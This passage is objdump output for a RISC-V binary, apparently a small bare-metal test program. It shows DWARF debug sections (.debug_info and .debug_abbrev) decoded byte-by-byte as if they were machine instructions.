    1ed4:	6964                	ld	s1,208(a0)
    1ed6:	0001                	nop
    1ed8:	2300                	fld	fs0,0(a4)
    1eda:	0000067b          	0x67b
    1ede:	6402                	ld	s0,0(sp)
    1ee0:	0169                	addi	sp,sp,26
    1ee2:	0000                	unimp
    1ee4:	00081a23          	sh	zero,20(a6) # 4c25e <_tbss_end+0x4c1da>
    1ee8:	0200                	addi	s0,sp,256
    1eea:	6964                	ld	s1,208(a0)
    1eec:	0001                	nop
    1eee:	2400                	fld	fs0,8(s0)
    1ef0:	0670                	addi	a2,sp,780
    1ef2:	0000                	unimp
    1ef4:	6502                	ld	a0,0(sp)
    1ef6:	00aa                	slli	ra,ra,0xa
    1ef8:	0000                	unimp
    1efa:	9102                	jalr	sp
    1efc:	2468                	fld	fa0,200(s0)
    1efe:	07ee                	slli	a5,a5,0x1b
    1f00:	0000                	unimp
    1f02:	6702                	ld	a4,0(sp)
    1f04:	00aa                	slli	ra,ra,0xa
    1f06:	0000                	unimp
    1f08:	9102                	jalr	sp
    1f0a:	0060                	addi	s0,sp,12
    1f0c:	fe2e                	sd	a1,312(sp)
    1f0e:	0005                	c.nop	1
    1f10:	0200                	addi	s0,sp,256
    1f12:	4959                	li	s2,22
    1f14:	0000                	unimp
    1f16:	3e00                	fld	fs0,56(a2)
    1f18:	001a                	c.slli	zero,0x6
    1f1a:	0080                	addi	s0,sp,64
    1f1c:	0000                	unimp
    1f1e:	2a00                	fld	fs0,16(a2)
    1f20:	0000                	unimp
    1f22:	0000                	unimp
    1f24:	0000                	unimp
    1f26:	0100                	addi	s0,sp,128
    1f28:	8d9c                	0x8d9c
    1f2a:	0011                	c.nop	4
    1f2c:	3200                	fld	fs0,32(a2)
    1f2e:	07ae                	slli	a5,a5,0xb
    1f30:	0000                	unimp
    1f32:	5902                	lw	s2,32(sp)
    1f34:	0049                	c.nop	18
    1f36:	0000                	unimp
    1f38:	9102                	jalr	sp
    1f3a:	326c                	fld	fa1,224(a2)
    1f3c:	07b9                	addi	a5,a5,14
    1f3e:	0000                	unimp
    1f40:	5902                	lw	s2,32(sp)
    1f42:	0cff                	0xcff
    1f44:	0000                	unimp
    1f46:	9102                	jalr	sp
    1f48:	0060                	addi	s0,sp,12
    1f4a:	b83e                	fsd	fa5,48(sp)
    1f4c:	0006                	c.slli	zero,0x1
    1f4e:	0200                	addi	s0,sp,256
    1f50:	1a52                	slli	s4,s4,0x34
    1f52:	001a                	c.slli	zero,0x6
    1f54:	0080                	addi	s0,sp,64
    1f56:	0000                	unimp
    1f58:	2400                	fld	fs0,8(s0)
    1f5a:	0000                	unimp
    1f5c:	0000                	unimp
    1f5e:	0000                	unimp
    1f60:	0100                	addi	s0,sp,128
    1f62:	c69c                	sw	a5,8(a3)
    1f64:	0011                	c.nop	4
    1f66:	3300                	fld	fs0,32(a4)
    1f68:	00646963          	bltu	s0,t1,1f7a <_tbss_end+0x1ef6>
    1f6c:	5202                	lw	tp,32(sp)
    1f6e:	0049                	c.nop	18
    1f70:	0000                	unimp
    1f72:	9102                	jalr	sp
    1f74:	336c                	fld	fa1,224(a4)
    1f76:	636e                	ld	t1,216(sp)
    1f78:	0200                	addi	s0,sp,256
    1f7a:	4952                	lw	s2,20(sp)
    1f7c:	0000                	unimp
    1f7e:	0200                	addi	s0,sp,256
    1f80:	6891                	lui	a7,0x4
    1f82:	3900                	fld	fs0,48(a0)
    1f84:	0000069b          	sext.w	a3,zero
    1f88:	4d02                	lw	s10,0(sp)
    1f8a:	19e4                	addi	s1,sp,252
    1f8c:	8000                	0x8000
    1f8e:	0000                	unimp
    1f90:	0000                	unimp
    1f92:	0036                	c.slli	zero,0xd
    1f94:	0000                	unimp
    1f96:	0000                	unimp
    1f98:	0000                	unimp
    1f9a:	9c01                	subw	s0,s0,s0
    1f9c:	11f0                	addi	a2,sp,236
    1f9e:	0000                	unimp
    1fa0:	02007333          	remu	t1,zero,zero
    1fa4:	e34d                	bnez	a4,2046 <_tbss_end+0x1fc2>
    1fa6:	0005                	c.nop	1
    1fa8:	0200                	addi	s0,sp,256
    1faa:	5891                	li	a7,-28
    1fac:	3f00                	fld	fs0,56(a4)
    1fae:	06dc                	addi	a5,sp,836
    1fb0:	0000                	unimp
    1fb2:	4802                	lw	a6,0(sp)
    1fb4:	19d4                	addi	a3,sp,244
    1fb6:	8000                	0x8000
    1fb8:	0000                	unimp
    1fba:	0000                	unimp
    1fbc:	0010                	0x10
    1fbe:	0000                	unimp
    1fc0:	0000                	unimp
    1fc2:	0000                	unimp
    1fc4:	9c01                	subw	s0,s0,s0
    1fc6:	7c40                	ld	s0,184(s0)
    1fc8:	0008                	0x8
    1fca:	0200                	addi	s0,sp,256
    1fcc:	0019bc43          	fmadd.s	fs8,fs3,ft1,ft0,rup
    1fd0:	0080                	addi	s0,sp,64
    1fd2:	0000                	unimp
    1fd4:	1800                	addi	s0,sp,48
    1fd6:	0000                	unimp
    1fd8:	0000                	unimp
    1fda:	0000                	unimp
    1fdc:	0100                	addi	s0,sp,128
    1fde:	359c                	fld	fa5,40(a1)
    1fe0:	0012                	c.slli	zero,0x4
    1fe2:	3200                	fld	fs0,32(a2)
    1fe4:	0719                	addi	a4,a4,6
    1fe6:	0000                	unimp
    1fe8:	4302                	lw	t1,0(sp)
    1fea:	0049                	c.nop	18
    1fec:	0000                	unimp
    1fee:	9102                	jalr	sp
    1ff0:	006c                	addi	a1,sp,12
    1ff2:	ac2e                	fsd	fa1,24(sp)
    1ff4:	0006                	c.slli	zero,0x1
    1ff6:	0200                	addi	s0,sp,256
    1ff8:	9a3e                	add	s4,s4,a5
    1ffa:	0000                	unimp
    1ffc:	a000                	fsd	fs0,0(s0)
    1ffe:	0019                	c.nop	6
    2000:	0080                	addi	s0,sp,64
    2002:	0000                	unimp
    2004:	1c00                	addi	s0,sp,560
    2006:	0000                	unimp
    2008:	0000                	unimp
    200a:	0000                	unimp
    200c:	0100                	addi	s0,sp,128
    200e:	819c                	0x819c
    2010:	0012                	c.slli	zero,0x4
    2012:	3200                	fld	fs0,32(a2)
    2014:	0650                	addi	a2,sp,772
    2016:	0000                	unimp
    2018:	3e02                	fld	ft8,32(sp)
    201a:	009a                	slli	ra,ra,0x6
    201c:	0000                	unimp
    201e:	9102                	jalr	sp
    2020:	3368                	fld	fa0,224(a4)
    2022:	7065                	c.lui	zero,0xffff9
    2024:	3e020063          	beqz	tp,2404 <_tbss_end+0x2380>
    2028:	009a                	slli	ra,ra,0x6
    202a:	0000                	unimp
    202c:	9102                	jalr	sp
    202e:	3260                	fld	fs0,224(a2)
    2030:	0696                	slli	a3,a3,0x5
    2032:	0000                	unimp
    2034:	3e02                	fld	ft8,32(sp)
    2036:	0b89                	addi	s7,s7,2
    2038:	0000                	unimp
    203a:	9102                	jalr	sp
    203c:	0058                	addi	a4,sp,4
    203e:	7541                	lui	a0,0xffff0
    2040:	0008                	0x8
    2042:	0200                	addi	s0,sp,256
    2044:	8038                	0x8038
    2046:	0019                	c.nop	6
    2048:	0080                	addi	s0,sp,64
    204a:	0000                	unimp
    204c:	2000                	fld	fs0,0(s0)
    204e:	0000                	unimp
    2050:	0000                	unimp
    2052:	0000                	unimp
    2054:	0100                	addi	s0,sp,128
    2056:	ad9c                	fsd	fa5,24(a1)
    2058:	0012                	c.slli	zero,0x4
    205a:	3200                	fld	fs0,32(a2)
    205c:	0719                	addi	a4,a4,6
    205e:	0000                	unimp
    2060:	3802                	fld	fa6,32(sp)
    2062:	009a                	slli	ra,ra,0x6
    2064:	0000                	unimp
    2066:	9102                	jalr	sp
    2068:	0068                	addi	a0,sp,12
    206a:	963e                	add	a2,a2,a5
    206c:	0008                	0x8
    206e:	0200                	addi	s0,sp,256
    2070:	7028                	ld	a0,96(s0)
    2072:	0018                	0x18
    2074:	0080                	addi	s0,sp,64
    2076:	0000                	unimp
    2078:	1000                	addi	s0,sp,32
    207a:	0001                	nop
    207c:	0000                	unimp
    207e:	0000                	unimp
    2080:	0100                	addi	s0,sp,128
    2082:	6a9c                	ld	a5,16(a3)
    2084:	32000013          	li	zero,800
    2088:	06d5                	addi	a3,a3,21
    208a:	0000                	unimp
    208c:	2802                	fld	fa6,0(sp)
    208e:	0049                	c.nop	18
    2090:	0000                	unimp
    2092:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    2096:	6934                	ld	a3,80(a0)
    2098:	0200                	addi	s0,sp,256
    209a:	492a                	lw	s2,136(sp)
    209c:	0000                	unimp
    209e:	0200                	addi	s0,sp,256
    20a0:	5c91                	li	s9,-28
    20a2:	0018802b          	0x18802b
    20a6:	0080                	addi	s0,sp,64
    20a8:	0000                	unimp
    20aa:	7c00                	ld	s0,56(s0)
    20ac:	0000                	unimp
    20ae:	0000                	unimp
    20b0:	0000                	unimp
    20b2:	2900                	fld	fs0,16(a0)
    20b4:	34000013          	li	zero,832
    20b8:	00727363          	bleu	t2,tp,20be <_tbss_end+0x203a>
    20bc:	3202                	fld	ft4,32(sp)
    20be:	009a                	slli	ra,ra,0x6
    20c0:	0000                	unimp
    20c2:	9102                	jalr	sp
    20c4:	2c68                	fld	fa0,216(s0)
    20c6:	188e                	slli	a7,a7,0x23
    20c8:	8000                	0x8000
    20ca:	0000                	unimp
    20cc:	0000                	unimp
    20ce:	000c                	0xc
    20d0:	0000                	unimp
    20d2:	0000                	unimp
    20d4:	0000                	unimp
    20d6:	f324                	sd	s1,96(a4)
    20d8:	0001                	nop
    20da:	0200                	addi	s0,sp,256
    20dc:	7832                	ld	a6,296(sp)
    20de:	0000                	unimp
    20e0:	0200                	addi	s0,sp,256
    20e2:	5091                	li	ra,-28
    20e4:	0000                	unimp
    20e6:	fc2c                	sd	a1,120(s0)
    20e8:	0018                	0x18
    20ea:	0080                	addi	s0,sp,64
    20ec:	0000                	unimp
    20ee:	7c00                	ld	s0,56(s0)
    20f0:	0000                	unimp
    20f2:	0000                	unimp
    20f4:	0000                	unimp
    20f6:	3400                	fld	fs0,40(s0)
    20f8:	00727363          	bleu	t2,tp,20fe <_tbss_end+0x207a>
    20fc:	3302                	fld	ft6,32(sp)
    20fe:	009a                	slli	ra,ra,0x6
    2100:	0000                	unimp
    2102:	9102                	jalr	sp
    2104:	2c60                	fld	fs0,216(s0)
    2106:	190a                	slli	s2,s2,0x22
    2108:	8000                	0x8000
    210a:	0000                	unimp
    210c:	0000                	unimp
    210e:	000c                	0xc
    2110:	0000                	unimp
    2112:	0000                	unimp
    2114:	0000                	unimp
    2116:	f324                	sd	s1,96(a4)
    2118:	0001                	nop
    211a:	0200                	addi	s0,sp,256
    211c:	00007833          	and	a6,zero,zero
    2120:	0200                	addi	s0,sp,256
    2122:	4891                	li	a7,4
    2124:	0000                	unimp
    2126:	3800                	fld	fs0,48(s0)
    2128:	0000077b          	0x77b
    212c:	1202                	slli	tp,tp,0x20
    212e:	009a                	slli	ra,ra,0x6
    2130:	0000                	unimp
    2132:	17fa                	slli	a5,a5,0x3e
    2134:	8000                	0x8000
    2136:	0000                	unimp
    2138:	0000                	unimp
    213a:	0076                	c.slli	zero,0x1d
    213c:	0000                	unimp
    213e:	0000                	unimp
    2140:	0000                	unimp
    2142:	9c01                	subw	s0,s0,s0
    2144:	000013d7          	0x13d7
    2148:	b332                	fsd	fa2,416(sp)
    214a:	02000007          	0x2000007
    214e:	9a12                	add	s4,s4,tp
    2150:	0000                	unimp
    2152:	0300                	addi	s0,sp,384
    2154:	e891                	bnez	s1,2168 <_tbss_end+0x20e4>
    2156:	327e                	fld	ft4,504(sp)
    2158:	0766                	slli	a4,a4,0x19
    215a:	0000                	unimp
    215c:	1202                	slli	tp,tp,0x20
    215e:	008a                	slli	ra,ra,0x2
    2160:	0000                	unimp
    2162:	7ee09103          	lh	sp,2030(ra)
    2166:	6b32                	ld	s6,264(sp)
    2168:	02000007          	0x2000007
    216c:	8a12                	mv	s4,tp
    216e:	0000                	unimp
    2170:	0300                	addi	s0,sp,384
    2172:	d891                	beqz	s1,2086 <_tbss_end+0x2002>
    2174:	327e                	fld	ft4,504(sp)
    2176:	0770                	addi	a2,sp,908
    2178:	0000                	unimp
    217a:	1202                	slli	tp,tp,0x20
    217c:	008a                	slli	ra,ra,0x2
    217e:	0000                	unimp
    2180:	7ed09103          	lh	sp,2029(ra)
    2184:	6b42                	ld	s6,16(sp)
    2186:	0008                	0x8
    2188:	0200                	addi	s0,sp,256
    218a:	e714                	sd	a3,8(a4)
    218c:	40000013          	li	zero,1024
    2190:	7f02                	ld	t5,32(sp)
    2192:	0000                	unimp
    2194:	950a                	add	a0,a0,sp
    2196:	0000                	unimp
    2198:	e700                	sd	s0,8(a4)
    219a:	0b000013          	li	zero,176
    219e:	0078                	addi	a4,sp,12
    21a0:	0000                	unimp
    21a2:	d7040007          	0xd7040007
    21a6:	38000013          	li	zero,896
    21aa:	071e                	slli	a4,a4,0x7
    21ac:	0000                	unimp
    21ae:	7201                	lui	tp,0xfffe0
    21b0:	008a                	slli	ra,ra,0x2
    21b2:	0000                	unimp
    21b4:	17c4                	addi	s1,sp,996
    21b6:	8000                	0x8000
    21b8:	0000                	unimp
    21ba:	0000                	unimp
    21bc:	0036                	c.slli	zero,0xd
    21be:	0000                	unimp
    21c0:	0000                	unimp
    21c2:	0000                	unimp
    21c4:	9c01                	subw	s0,s0,s0
    21c6:	1428                	addi	a0,sp,552
    21c8:	0000                	unimp
    21ca:	01007833          	and	a6,zero,a6
    21ce:	8a72                	mv	s4,t3
    21d0:	0000                	unimp
    21d2:	0200                	addi	s0,sp,256
    21d4:	5891                	li	a7,-28
    21d6:	6234                	ld	a3,64(a2)
    21d8:	7469                	lui	s0,0xffffa
    21da:	0100                	addi	s0,sp,128
    21dc:	8a74                	0x8a74
    21de:	0000                	unimp
    21e0:	0200                	addi	s0,sp,256
    21e2:	6891                	lui	a7,0x4
    21e4:	4300                	lw	s0,0(a4)
    21e6:	06a4                	addi	s1,sp,840
    21e8:	0000                	unimp
    21ea:	5e01                	li	t3,-32
    21ec:	173a                	slli	a4,a4,0x2e
    21ee:	8000                	0x8000
    21f0:	0000                	unimp
    21f2:	0000                	unimp
    21f4:	008a                	slli	ra,ra,0x2
    21f6:	0000                	unimp
    21f8:	0000                	unimp
    21fa:	0000                	unimp
    21fc:	9c01                	subw	s0,s0,s0
    21fe:	1489                	addi	s1,s1,-30
    2200:	0000                	unimp
    2202:	d332                	sw	a2,164(sp)
    2204:	01000007          	0x1000007
    2208:	495e                	lw	s2,212(sp)
    220a:	0000                	unimp
    220c:	0200                	addi	s0,sp,256
    220e:	6c91                	lui	s9,0x4
    2210:	5224                	lw	s1,96(a2)
    2212:	0008                	0x8
    2214:	0100                	addi	s0,sp,128
    2216:	5060                	lw	s0,100(s0)
    2218:	0000                	unimp
    221a:	0900                	addi	s0,sp,144
    221c:	01b1e403          	lwu	s0,27(gp) # 8000313b <__global_pointer$+0x1b>
    2220:	0080                	addi	s0,sp,64
    2222:	0000                	unimp
    2224:	2400                	fld	fs0,8(s0)
    2226:	000004c7          	fmsub.s	fs1,ft0,ft0,ft0,rne
    222a:	6101                	0x6101
    222c:	0050                	addi	a2,sp,4
    222e:	0000                	unimp
    2230:	0309                	addi	t1,t1,2
    2232:	b1e0                	fsd	fs0,224(a1)
    2234:	8001                	srli	s0,s0,0x0
    2236:	0000                	unimp
    2238:	0000                	unimp
    223a:	00084c3b          	0x84c3b
    223e:	0100                	addi	s0,sp,128
    2240:	4962                	lw	s2,24(sp)
    2242:	0000                	unimp
    2244:	0000                	unimp
    2246:	8338                	0x8338
    2248:	01000007          	0x1000007
    224c:	494e                	lw	s2,208(sp)
    224e:	0000                	unimp
    2250:	1800                	addi	s0,sp,48
    2252:	0016                	c.slli	zero,0x5
    2254:	0080                	addi	s0,sp,64
    2256:	0000                	unimp
    2258:	2200                	fld	fs0,0(a2)
    225a:	0001                	nop
    225c:	0000                	unimp
    225e:	0000                	unimp
    2260:	0100                	addi	s0,sp,128
    2262:	449c                	lw	a5,8(s1)
    2264:	0015                	c.nop	5
    2266:	3300                	fld	fs0,32(a4)
    2268:	006e                	c.slli	zero,0x1b
    226a:	4e01                	li	t3,0
    226c:	0049                	c.nop	18
    226e:	0000                	unimp
    2270:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    2274:	5832                	lw	a6,44(sp)
    2276:	0008                	0x8
    2278:	0100                	addi	s0,sp,128
    227a:	444e                	lw	s0,208(sp)
    227c:	0015                	c.nop	5
    227e:	0300                	addi	s0,sp,384
    2280:	b091                	j	1ac4 <_tbss_end+0x1a40>
    2282:	327f                	0x327f
    2284:	08b1                	addi	a7,a7,12
    2286:	0000                	unimp
    2288:	4e01                	li	t3,0
    228a:	0000155b          	0x155b
    228e:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    2292:	6934                	ld	a3,80(a0)
    2294:	0100                	addi	s0,sp,128
    2296:	4950                	lw	a2,20(a0)
    2298:	0000                	unimp
    229a:	0200                	addi	s0,sp,256
    229c:	6c91                	lui	s9,0x4
    229e:	322c                	fld	fa1,96(a2)
    22a0:	0016                	c.slli	zero,0x5
    22a2:	0080                	addi	s0,sp,64
    22a4:	0000                	unimp
    22a6:	9c00                	0x9c00
    22a8:	0000                	unimp
    22aa:	0000                	unimp
    22ac:	0000                	unimp
    22ae:	3400                	fld	fs0,40(s0)
    22b0:	3074                	fld	fa3,224(s0)
    22b2:	0100                	addi	s0,sp,128
    22b4:	4a54                	lw	a3,20(a2)
    22b6:	0015                	c.nop	5
    22b8:	0200                	addi	s0,sp,256
    22ba:	6091                	lui	ra,0x4
    22bc:	7434                	ld	a3,104(s0)
    22be:	0031                	c.nop	12
    22c0:	5401                	li	s0,-32
    22c2:	154a                	slli	a0,a0,0x32
    22c4:	0000                	unimp
    22c6:	9102                	jalr	sp
    22c8:	3458                	fld	fa4,168(s0)
    22ca:	3076                	fld	ft0,376(sp)
    22cc:	0100                	addi	s0,sp,128
    22ce:	4a55                	li	s4,21
    22d0:	0015                	c.nop	5
    22d2:	0200                	addi	s0,sp,256
    22d4:	5091                	li	ra,-28
    22d6:	7634                	ld	a3,104(a2)
    22d8:	0031                	c.nop	12
    22da:	5501                	li	a0,-32
    22dc:	154a                	slli	a0,a0,0x32
    22de:	0000                	unimp
    22e0:	9102                	jalr	sp
    22e2:	3448                	fld	fa0,168(s0)
    22e4:	7165                	addi	sp,sp,-400
    22e6:	0031                	c.nop	12
    22e8:	5601                	li	a2,-32
    22ea:	0049                	c.nop	18
    22ec:	0000                	unimp
    22ee:	9102                	jalr	sp
    22f0:	3444                	fld	fs1,168(s0)
    22f2:	7165                	addi	sp,sp,-400
    22f4:	0032                	c.slli	zero,0xc
    22f6:	5601                	li	a2,-32
    22f8:	0049                	c.nop	18
    22fa:	0000                	unimp
    22fc:	9102                	jalr	sp
    22fe:	0040                	addi	s0,sp,4
    2300:	0f00                	addi	s0,sp,912
    2302:	5608                	lw	a0,40(a2)
    2304:	0015                	c.nop	5
    2306:	0200                	addi	s0,sp,256
    2308:	0408                	addi	a0,sp,512
    230a:	036c                	addi	a1,sp,396
    230c:	0000                	unimp
    230e:	4a05                	li	s4,1
    2310:	0015                	c.nop	5
    2312:	0400                	addi	s0,sp,512
    2314:	1551                	addi	a0,a0,-12
    2316:	0000                	unimp
    2318:	1551080f          	0x1551080f
    231c:	0000                	unimp
    231e:	b138                	fsd	fa4,96(a0)
    2320:	0008                	0x8
    2322:	0100                	addi	s0,sp,128
    2324:	493e                	lw	s2,204(sp)
    2326:	0000                	unimp
    2328:	0e00                	addi	s0,sp,784
    232a:	0015                	c.nop	5
    232c:	0080                	addi	s0,sp,64
    232e:	0000                	unimp
    2330:	0a00                	addi	s0,sp,272
    2332:	0001                	nop
    2334:	0000                	unimp
    2336:	0000                	unimp
    2338:	0100                	addi	s0,sp,128
    233a:	fe9c                	sd	a5,56(a3)
    233c:	0015                	c.nop	5
    233e:	3300                	fld	fs0,32(a4)
    2340:	006e                	c.slli	zero,0x1b
    2342:	3e01                	addiw	t3,t3,-32
    2344:	0049                	c.nop	18
    2346:	0000                	unimp
    2348:	9102                	jalr	sp
    234a:	324c                	fld	fa1,160(a2)
    234c:	0858                	addi	a4,sp,20
    234e:	0000                	unimp
    2350:	3e01                	addiw	t3,t3,-32
    2352:	15fe                	slli	a1,a1,0x3f
    2354:	0000                	unimp
    2356:	9102                	jalr	sp
    2358:	3240                	fld	fs0,160(a2)
    235a:	08b1                	addi	a7,a7,12
    235c:	0000                	unimp
    235e:	3e01                	addiw	t3,t3,-32
    2360:	1604                	addi	s1,sp,800
    2362:	0000                	unimp
    2364:	7fb89103          	lh	sp,2043(a7)
    2368:	6934                	ld	a3,80(a0)
    236a:	0100                	addi	s0,sp,128
    236c:	4940                	lw	s0,20(a0)
    236e:	0000                	unimp
    2370:	0200                	addi	s0,sp,256
    2372:	6c91                	lui	s9,0x4
    2374:	282c                	fld	fa1,80(s0)
    2376:	0015                	c.nop	5
    2378:	0080                	addi	s0,sp,64
    237a:	0000                	unimp
    237c:	8000                	0x8000
    237e:	0000                	unimp
    2380:	0000                	unimp
    2382:	0000                	unimp
    2384:	3400                	fld	fs0,40(s0)
    2386:	3074                	fld	fa3,224(s0)
    2388:	0100                	addi	s0,sp,128
    238a:	4944                	lw	s1,20(a0)
    238c:	0000                	unimp
    238e:	0200                	addi	s0,sp,256
    2390:	6891                	lui	a7,0x4
    2392:	7434                	ld	a3,104(s0)
    2394:	0031                	c.nop	12
    2396:	4401                	li	s0,0
    2398:	0049                	c.nop	18
    239a:	0000                	unimp
    239c:	9102                	jalr	sp
    239e:	3464                	fld	fs1,232(s0)
    23a0:	3076                	fld	ft0,376(sp)
    23a2:	0100                	addi	s0,sp,128
    23a4:	4945                	li	s2,17
    23a6:	0000                	unimp
    23a8:	0200                	addi	s0,sp,256
    23aa:	6091                	lui	ra,0x4
    23ac:	7634                	ld	a3,104(a2)
    23ae:	0031                	c.nop	12
    23b0:	4501                	li	a0,0
    23b2:	0049                	c.nop	18
    23b4:	0000                	unimp
    23b6:	9102                	jalr	sp
    23b8:	005c                	addi	a5,sp,4
    23ba:	0f00                	addi	s0,sp,912
    23bc:	5508                	lw	a0,40(a0)
    23be:	0000                	unimp
    23c0:	0f00                	addi	s0,sp,912
    23c2:	5a08                	lw	a0,48(a2)
    23c4:	0000                	unimp
    23c6:	4300                	lw	s0,0(a4)
    23c8:	00000743          	fmadd.s	fa4,ft0,ft0,ft0,rne
    23cc:	3301                	addiw	t1,t1,-32
    23ce:	14f2                	slli	s1,s1,0x3c
    23d0:	8000                	0x8000
    23d2:	0000                	unimp
    23d4:	0000                	unimp
    23d6:	001c                	0x1c
    23d8:	0000                	unimp
    23da:	0000                	unimp
    23dc:	0000                	unimp
    23de:	9c01                	subw	s0,s0,s0
    23e0:	1650                	addi	a2,sp,804
    23e2:	0000                	unimp
    23e4:	2f32                	fld	ft10,264(sp)
    23e6:	0006                	c.slli	zero,0x1
    23e8:	0100                	addi	s0,sp,128
    23ea:	0005e333          	or	t1,a1,zero
    23ee:	0200                	addi	s0,sp,256
    23f0:	6891                	lui	a7,0x4
    23f2:	01006e33          	or	t3,zero,a6
    23f6:	00004933          	xor	s2,zero,zero
    23fa:	0200                	addi	s0,sp,256
    23fc:	6491                	lui	s1,0x4
    23fe:	72726133          	0x72726133
    2402:	0100                	addi	s0,sp,128
    2404:	00155b33          	srl	s6,a0,ra
    2408:	0200                	addi	s0,sp,256
    240a:	5891                	li	a7,-28
    240c:	4400                	lw	s0,8(s0)
    240e:	0645                	addi	a2,a2,17
    2410:	0000                	unimp
    2412:	2801                	sext.w	a6,a6
    2414:	14d6                	slli	s1,s1,0x35
    2416:	8000                	0x8000
    2418:	0000                	unimp
    241a:	0000                	unimp
    241c:	001c                	0x1c
    241e:	0000                	unimp
    2420:	0000                	unimp
    2422:	0000                	unimp
    2424:	9c01                	subw	s0,s0,s0
    2426:	2f32                	fld	ft10,264(sp)
    2428:	0006                	c.slli	zero,0x1
    242a:	0100                	addi	s0,sp,128
    242c:	e328                	sd	a0,64(a4)
    242e:	0005                	c.nop	1
    2430:	0200                	addi	s0,sp,256
    2432:	6891                	lui	a7,0x4
    2434:	01006e33          	or	t3,zero,a6
    2438:	4928                	lw	a0,80(a0)
    243a:	0000                	unimp
    243c:	0200                	addi	s0,sp,256
    243e:	6491                	lui	s1,0x4
    2440:	72726133          	0x72726133
    2444:	0100                	addi	s0,sp,128
    2446:	0428                	addi	a0,sp,520
    2448:	0016                	c.slli	zero,0x5
    244a:	0200                	addi	s0,sp,256
    244c:	5891                	li	a7,-28
	...

Disassembly of section .debug_abbrev:

0000000000000000 <.debug_abbrev>:
   0:	1101                	addi	sp,sp,-32
   2:	2501                	sext.w	a0,a0
   4:	130e                	slli	t1,t1,0x23
   6:	1b0e030b          	0x1b0e030b
   a:	110e                	slli	sp,sp,0x23
   c:	1201                	addi	tp,tp,-32
   e:	00171007          	0x171007
  12:	0200                	addi	s0,sp,256
  14:	0024                	addi	s1,sp,8
  16:	0b3e0b0b          	0xb3e0b0b
  1a:	00000e03          	lb	t3,0(zero) # ffffffffffff9000 <_end+0xffffffff7ffdde00>
  1e:	03001603          	lh	a2,48(zero) # 30 <_tdata_begin+0x30>
  22:	3a0e                	fld	fs4,224(sp)
  24:	490b3b0b          	0x490b3b0b
  28:	04000013          	li	zero,64
  2c:	0024                	addi	s1,sp,8
  2e:	0b3e0b0b          	0xb3e0b0b
  32:	00000803          	lb	a6,0(zero) # 0 <_tdata_begin>
  36:	1605                	addi	a2,a2,-31
  38:	0300                	addi	s0,sp,384
  3a:	3a0e                	fld	fs4,224(sp)
  3c:	49053b0b          	0x49053b0b
  40:	06000013          	li	zero,96
  44:	0b0b0117          	auipc	sp,0xb0b0
  48:	0b3a                	slli	s6,s6,0xe
  4a:	13010b3b          	0x13010b3b
  4e:	0000                	unimp
  50:	03000d07          	0x3000d07
  54:	3a0e                	fld	fs4,224(sp)
  56:	490b3b0b          	0x490b3b0b
  5a:	08000013          	li	zero,128
  5e:	0101                	addi	sp,sp,0
  60:	1349                	addi	t1,t1,-14
  62:	1301                	addi	t1,t1,-32
  64:	0000                	unimp
  66:	2109                	addiw	sp,sp,2
  68:	4900                	lw	s0,16(a0)
  6a:	000b2f13          	slti	t5,s6,0
  6e:	0a00                	addi	s0,sp,272
  70:	0b0b0113          	addi	sp,s6,176 # 20b0 <_tbss_end+0x202c>
  74:	0b3a                	slli	s6,s6,0xe
  76:	13010b3b          	0x13010b3b
  7a:	0000                	unimp
  7c:	03000d0b          	0x3000d0b
  80:	3a0e                	fld	fs4,224(sp)
  82:	490b3b0b          	0x490b3b0b
  86:	000b3813          	sltiu	a6,s6,0
  8a:	0c00                	addi	s0,sp,528
  8c:	0b0b000f          	0xb0b000f
  90:	0000                	unimp
  92:	130d                	addi	t1,t1,-29
  94:	0301                	addi	t1,t1,0
  96:	0b0e                	slli	s6,s6,0x3
  98:	3b0b3a0b          	0x3b0b3a0b
  9c:	0013010b          	0x13010b
  a0:	0e00                	addi	s0,sp,784
  a2:	000d                	c.nop	3
  a4:	0b3a0803          	lb	a6,179(s4) # fffffffffffe30b3 <_end+0xffffffff7ffc7eb3>
  a8:	13490b3b          	0x13490b3b
  ac:	0b38                	addi	a4,sp,408
  ae:	0000                	unimp
  b0:	0b000f0f          	0xb000f0f
  b4:	0013490b          	0x13490b
  b8:	1000                	addi	s0,sp,32
  ba:	0e030113          	addi	sp,t1,224 # 20e0 <_tbss_end+0x205c>
  be:	0b3a050b          	0xb3a050b
  c2:	13010b3b          	0x13010b3b
  c6:	0000                	unimp
  c8:	0d11                	addi	s10,s10,4
  ca:	0300                	addi	s0,sp,384
  cc:	3a0e                	fld	fs4,224(sp)
  ce:	490b3b0b          	0x490b3b0b
  d2:	00053813          	sltiu	a6,a0,0
  d6:	1200                	addi	s0,sp,288
  d8:	0015                	c.nop	5
  da:	00001927          	0x1927
  de:	27011513          	0x27011513
  e2:	4919                	li	s2,6
  e4:	00130113          	addi	sp,t1,1
  e8:	1400                	addi	s0,sp,544
  ea:	0005                	c.nop	1
  ec:	1349                	addi	t1,t1,-14
  ee:	0000                	unimp
  f0:	2615                	addiw	a2,a2,5
  f2:	4900                	lw	s0,16(a0)
  f4:	16000013          	li	zero,352
  f8:	0e030113          	addi	sp,t1,224
  fc:	0b3a050b          	0xb3a050b
 100:	1301053b          	0x1301053b
 104:	0000                	unimp
 106:	03000d17          	auipc	s10,0x3000
 10a:	3a0e                	fld	fs4,224(sp)
 10c:	49053b0b          	0x49053b0b
 110:	000b3813          	sltiu	a6,s6,0
 114:	1800                	addi	s0,sp,48
 116:	000d                	c.nop	3
 118:	0b3a0e03          	lb	t3,179(s4)
 11c:	1349053b          	0x1349053b
 120:	0538                	addi	a4,sp,648
 122:	0000                	unimp
 124:	1319                	addi	t1,t1,-26
 126:	0301                	addi	t1,t1,0
 128:	0b0e                	slli	s6,s6,0x3
 12a:	3b0b3a0b          	0x3b0b3a0b
 12e:	0105                	addi	sp,sp,1
 130:	1a000013          	li	zero,416
 134:	0b0b0113          	addi	sp,s6,176
 138:	0b3a                	slli	s6,s6,0xe
 13a:	1301053b          	0x1301053b
 13e:	0000                	unimp
 140:	0b01131b          	0xb01131b
 144:	3a05                	addiw	s4,s4,-31
 146:	01053b0b          	0x1053b0b
 14a:	1c000013          	li	zero,448
 14e:	050b0117          	auipc	sp,0x50b0
 152:	0b3a                	slli	s6,s6,0xe
 154:	1301053b          	0x1301053b
 158:	0000                	unimp
 15a:	0d1d                	addi	s10,s10,7
 15c:	0300                	addi	s0,sp,384
 15e:	3a0e                	fld	fs4,224(sp)
